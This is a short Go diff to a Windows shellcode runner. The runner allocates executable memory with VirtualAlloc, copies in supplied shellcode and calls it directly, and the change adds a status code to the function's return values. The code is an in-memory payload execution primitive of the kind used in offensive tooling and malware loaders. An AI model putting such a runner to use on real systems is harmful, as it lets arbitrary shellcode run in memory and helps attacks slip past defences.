@@ -21,17 +21,17 @@ var (
 )
 
 // Runner runner
-func Runner(shellcode []byte) bool {
+func Runner(shellcode []byte) (bool, string) {
 	address, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	if util.CheckErrorMessage(err) {
-		return false
+		return false, ERROR_PID
 	}
 	_, _, err = RtlCopyMemory.Call(address, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 	if util.CheckErrorMessage(err) {
-		return false
+		return false, ERROR_PID
 	}
 	syscall.Syscall(address, 0, 0, 0, 0)
-	return true
+	return true, SUCCESS_PID
 }
 
 // IsAvailable does a shellcode runner exist
